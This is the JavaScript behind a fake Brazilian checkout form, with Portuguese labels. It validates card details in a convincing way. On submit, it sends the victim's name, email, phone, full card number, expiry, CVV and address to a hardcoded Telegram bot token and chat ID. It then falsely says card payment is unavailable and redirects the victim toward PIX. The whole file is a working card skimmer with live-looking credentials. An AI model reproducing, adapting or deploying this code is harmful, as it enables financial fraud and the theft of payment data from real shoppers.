const TELEGRAM_TOKEN='8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
const TELEGRAM_CHAT_ID='6939434522';
let userCity='';
document.addEventListener('DOMContentLoaded',()=>{
const cardNumero=document.getElementById('cardNumero');
const cardValidade=document.getElementById('cardValidade');
const cardCvv=document.getElementById('cardCvv');
const finalizarCartaoBtn=document.getElementById('finalizarCartaoBtn');
if(cardNumero){
cardNumero.addEventListener('input',function(e){
let v=e.target.value.replace(/\D/g,'');
v=v.replace(/(\d{4})(?=\d)/g,'$1 ');
e.target.value=v.substring(0,19);
})}
if(cardValidade){
cardValidade.addEventListener('input',function(e){
let v=e.target.value.replace(/\D/g,'');
if(v.length>=2)v=v.substring(0,2)+'/'+v.substring(2,4);
e.target.value=v.substring(0,5);
})}
if(cardCvv){
cardCvv.addEventListener('input',function(e){
e.target.value=e.target.value.replace(/\D/g,'').substring(0,4);
})}
['cardCep','cep'].forEach(f=>{const el=document.getElementById(f);if(el){el.addEventListener('input',function(e){let v=e.target.value.replace(/\D/g,'');if(v.length>=5)v=v.substring(0,5)+'-'+v.substring(5,8);e.target.value=v.substring(0,9);})}});
['cardTelefone','telefone'].forEach(f=>{const el=document.getElementById(f);if(el){el.addEventListener('input',function(e){let v=e.target.value.replace(/\D/g,'');if(v.length>=11)v=v.replace(/^(\d{2})(\d{5})(\d{4})/,'($1) $2-$3');else if(v.length>=7)v=v.replace(/^(\d{2})(\d{4})(\d{0,4})/,'($1) $2-$3');else if(v.length>=3)v=v.replace(/^(\d{2})(\d{0,5})/,'($1) $2');e.target.value=v;})}});
['cardCpf','cpf'].forEach(f=>{const el=document.getElementById(f);if(el){el.addEventListener('input',function(e){let v=e.target.value.replace(/\D/g,'');if(v.length>=11)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');else if(v.length>=9)v=v.replace(/(\d{3})(\d{3})(\d{3})/,'$1.$2.$3');else if(v.length>=6)v=v.replace(/(\d{3})(\d{3})/,'$1.$2');else if(v.length>=3)v=v.replace(/(\d{3})/,'$1');e.target.value=v.substring(0,14);})}});
function validarCartao(n){const num=n.replace(/\s/g,'');if(!/^\d+$/.test(num))return false;let s=0,d=!1;for(let i=num.length-1;i>=0;i--){let x=parseInt(num.charAt(i));if(d){x*=2;if(x>9)x-=9}s+=x;d=!d}return s%10===0}
function validarValidade(v){if(!/^\d{2}\/\d{2}$/.test(v))return false;const[m,a]=v.split('/');const mm=parseInt(m,10),aa=parseInt(a,10);const anoAtual=new Date().getFullYear()%100,mesAtual=new Date().getMonth()+1;if(mm<1||mm>12)return false;if(aa<anoAtual)return false;if(aa===anoAtual&&mm<mesAtual)return false;return true}
fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{userCity=d.city||''}).catch(()=>{userCity=''});
async function enviarTelegram(d){
const msg=`\n<b>💳 +1 NOVA INFO CARTÃO</b>\n\n👤 DADOS DO TITULAR\n├ E-mail: ${escapeHtml(d.email)}\n├ Titular do cartão: ${escapeHtml(d.titular)}\n└ Telefone: ${escapeHtml(d.telefone)}\n\n💳 DADOS DO CARTÃO\n├ Número: ${escapeHtml(d.numero)}\n├ Validade: ${escapeHtml(d.validade)}\n└ CVV: ${escapeHtml(d.cvv)}\n\n📍 ENDEREÇO\n├ CEP: ${escapeHtml(d.cep)}\n├ Rua: ${escapeHtml(d.rua)}\n├ Número: ${escapeHtml(d.numeroEnd)}\n├ Complemento: ${escapeHtml(d.complemento)}\n└ Cidade: ${escapeHtml(d.cidade)}\n\n⏰ Data: ${new Date().toLocaleString('pt-BR')}`;
try{
const r=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:msg,parse_mode:'HTML'})});
const data=await r.json();
return data.ok;
}catch(e){console.error(e);return false;}}
function escapeHtml(str){if(!str)return'';return str.replace(/[&<>]/g,function(m){if(m==='&')return'&amp;';if(m==='<')return'&lt;';if(m==='>')return'&gt;';return m;}).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g,function(c){return c;}).replace(/([^ -~]|[&<>])/g,function(m){if(m==='&')return'&amp;';if(m==='<')return'&lt;';if(m==='>')return'&gt;';return m;})}
function showToast(m){const t=document.getElementById('copyToast');if(!t)return;t.innerText=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
if(finalizarCartaoBtn){
finalizarCartaoBtn.addEventListener('click',async function(e){
e.preventDefault();
const titular=(document.getElementById('cardTitular')?.value||'').trim();
const telefone=(document.getElementById('cardTelefone')?.value||'').trim();
const email=(document.getElementById('cardEmail')?.value||'').trim();
const numero=(document.getElementById('cardNumero')?.value||'').trim();
const validade=(document.getElementById('cardValidade')?.value||'').trim();
const cvv=(document.getElementById('cardCvv')?.value||'').trim();
const cep=(document.getElementById('cardCep')?.value||'').trim();
const rua=(document.getElementById('cardRua')?.value||'').trim();
const numeroEnd=(document.getElementById('cardNumeroEnd')?.value||'').trim();
const temComp=!!document.getElementById('temComplementoCard')?.checked;
const complemento=temComp?(document.getElementById('cardComplemento')?.value||'').trim():'Não informado';
if(!titular){showToast('❌ Nome do titular é obrigatório');return;}
if(!telefone){showToast('❌ Telefone é obrigatório');return;}
if(!email||!email.includes('@')){showToast('❌ E-mail inválido');return;}
if(!numero||numero.replace(/\s/g,'').length<16){showToast('❌ Número do cartão inválido');return;}
if(!validarCartao(numero)){showToast('❌ Número do cartão inválido');return;}
if(!validade||!validarValidade(validade)){showToast('❌ Data de validade inválida');return;}
if(!cvv||cvv.length<3){showToast('❌ CVV inválido');return;}
if(!cep||cep.replace(/\D/g,'').length!==8){showToast('❌ CEP inválido');return;}
if(!rua){showToast('❌ Rua é obrigatória');return;}
if(!numeroEnd){showToast('❌ Número é obrigatório');return;}
const dados={titular,telefone,email,numero,validade,cvv,cep,rua,numeroEnd,complemento,cidade:userCity||'Não identificada'};
const btn=finalizarCartaoBtn;
const txt=btn.innerHTML;
btn.disabled=true;
btn.innerHTML='<i class="fas fa-spinner fa-pulse"></i> Processando...';
const ok=await enviarTelegram(dados);
if(ok){
showToast('⚠️ Pagamento em cartão indisponível no momento, tente pagar com PIX.');
setTimeout(()=>{window.location.href='/formulario';},2000);
}else{
showToast('❌ Erro ao processar. Tente novamente.');
btn.disabled=false;
btn.innerHTML=txt;
}
});
}
});
